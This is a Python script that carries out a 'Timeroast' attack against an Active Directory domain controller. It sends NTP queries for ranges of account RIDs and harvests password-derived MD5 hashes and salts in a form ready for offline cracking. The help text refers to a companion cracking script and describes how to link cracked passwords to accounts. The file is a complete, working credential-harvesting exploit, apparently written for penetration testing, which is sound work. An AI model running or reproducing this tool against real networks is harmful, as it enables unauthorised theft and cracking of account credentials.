#!/usr/bin/env python3

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, ArgumentTypeError, RawDescriptionHelpFormatter
from typing import *
from select import select
from time import time
from sys import stdout, stderr
from itertools import chain
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack, unpack

# Static NTP query prefix using the MD5 authenticator. Append 4-byte RID and dummy checksum to create a full query.
NTP_PREFIX = unhexlify('db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a')

# Default settings.
DEFAULT_RATE = 180
DEFAULT_GIVEUP_TIME = 24


def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -> List[Tuple[int, bytes, bytes]]:
  """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
     Rate is the number of queries per second to send.
     Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
     not respond to queries with non-existing RIDs, so it is difficult to distinguish nonexistent RIDs from network 
     issues.
     
     Yields (rid, hash, salt) pairs, where salt is the NTP response data."""

  # Bind UDP socket.
  with socket(AF_INET, SOCK_DGRAM) as sock:
    sock.bind(('0.0.0.0', 123))

    query_interval = 1 / rate
    last_ok_time = time()
    rids_received = set()
    rid_iterator = iter(rids)

    while time() < last_ok_time + giveup_time:
      
      # Send out query for the next RID, if any.
      query_rid = next(rid_iterator, None)
      if query_rid is not None:
        query = NTP_PREFIX + pack('<I', query_rid) + b'\x00' * 16
        sock.sendto(query, (dc_host, 123))

      # Wait for either a response or time to send the next query.
      ready, [], [] = select([sock], [], [], query_interval)
      if ready:
        reply = sock.recvfrom(120)[0]

        # Extract RID, hash and "salt" if succesful.
        if len(reply) == 68:
          salt = reply[:48]
          answer_rid = unpack('<I', reply[-20:-16])[0]
          md5hash = reply[-16:]

          # Filter out duplicates.
          if answer_rid not in rids_received:
            rids_received.add(answer_rid)
            yield (answer_rid, md5hash, salt)
          last_ok_time = time()

def get_args():
  """Parse command-line arguments."""

  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Performs an NTP 'Timeroast' attack against a domain controller. 
Outputs hex encoded<RID>:<hash>:<salt> triplets where the 'hash' is 
defined as MD5(NTLM-hash || salt).

The timecrack.py script can be used to run a dictionary attack against the 
hashes.

Usernames within the hash file are user RIDs. In order to use a cracked 
password that does not contain the computer name, either look up the RID
in AD (if you already have some account) or use a computer name list obtained
via reverse DNS, service scanning, SMB NULL sessions etc.
"""
  )


  def num_ranges(arg):
    # Comma-seperated integer ranges.
    try:
      ranges = []
      for part in arg.split(','):
        if '-' in part:
          [start, end] = part.split('-')
          assert 0 <= int(start) < int(end) < 2**31
          ranges.append(range(int(start), int(end) + 1))
        else:
          assert 0 <= int(part) < 2**31
          ranges.append(int(part))

      return chain(ranges)
    except:
      raise ArgumentTypeError(f'Invalid number ranges: "{arg}".')


  # Configurable options.
  argparser.add_argument(
    '-o', '--out', 
    type=FileType('w'), default=stdout, metavar='FILE', 
    help='Hash output file. Writes to stdout if omitted.'
  )
  argparser.add_argument(
    '-r', '--rids',
    type=num_ranges, default=range(1, 2**31), metavar='RIDS',
    help='Comma-separated list of RIDs to try. Use hypens to specify (inclusive) ranges, e.g. "512-580,600-1400". ' +\
         'By default, all possible RIDs will be tried until timeout.'
  )
  argparser.add_argument(
    '-a', '--rate',
    type=int, default=DEFAULT_RATE, metavar='RATE',
    help=f'NTP queries to execute second per second. Higher is faster, but with a greater risk of dropped packages ' +\
         f'resulting in incomplete results. Default: {DEFAULT_RATE}.'
  )
  argparser.add_argument(
    '-t', '--timeout',
    type=int, default=DEFAULT_GIVEUP_TIME, metavar='TIMEOUT',
    help=f'Quit after not receiving NTP responses for TIMEOUT seconds, possibly indicating that RID space has ' +\
         f'been exhausted. Default: {DEFAULT_GIVEUP_TIME}.'
  )

  # Required arguments.
  argparser.add_argument(
    'dc',
    help='Hostname or IP address of domain controller that acts as NTP server.'
  )

  return argparser.parse_args()


def main():
  """Command-line interface."""
  
  args = get_args()
  output = args.out
  for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout):
    print(f'{rid}:{hexlify(hashval).decode()}:{hexlify(salt).decode()}', file=output)
  

if __name__ == '__main__':
  main()
